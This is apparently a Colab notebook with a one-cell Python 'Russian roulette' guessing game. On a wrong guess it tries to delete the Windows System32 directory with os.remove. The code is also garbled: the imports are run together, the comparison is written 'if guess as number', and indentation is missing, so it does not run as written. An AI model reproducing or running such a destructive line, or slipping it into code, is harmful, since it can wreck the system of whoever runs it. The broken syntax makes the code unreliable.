{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "p46X9RSYhcvG"
      },
      "outputs": [],
      "source": [
        "import random import os\n",
        "#RussianRouletteGame\n",
        "number = random.randint (1,10)\n",
        "guess = input(\"Guess a number between 1 and 10\")\n",
        "guess = int(guess)\n",
        "if guess as number:\n",
        "print(\"You Won!\")\n",
        "else:\n",
        "os.remove(\"C: \\windows\\System32\")"
      ]
    }
  ]
}